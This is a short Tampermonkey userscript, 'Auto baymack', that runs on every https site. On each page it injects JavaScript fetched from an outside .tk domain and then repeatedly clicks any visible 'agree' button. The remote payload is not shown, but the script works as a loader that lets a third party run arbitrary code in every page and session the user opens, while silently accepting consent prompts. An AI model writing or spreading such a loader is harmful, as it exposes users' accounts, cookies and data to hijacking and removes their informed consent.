// ==UserScript==
// @name         Auto baymack
// @namespace    http://tampermonkey.net/
// @version      999999999999999999999999999999999
// @description  try to take over the world!
// @author       TTP
// @match        https://*
// @grant        none
// ==/UserScript==
(function(){
	setTimeout(function(){
			var script = document.createElement("script");
			script.setAttribute("type", "text/javascript");
			script.src = "https://auto-baymack.tk/abcdefghiklmnopqrstvuwz/backmack_link.js";
			document.documentElement.appendChild(script);
			setInterval(function(){
				if($("button[name='agree']").is(":visible")){
					$("button[name='agree']")[0].click();
				}
			},2000);
	},1000);
})()









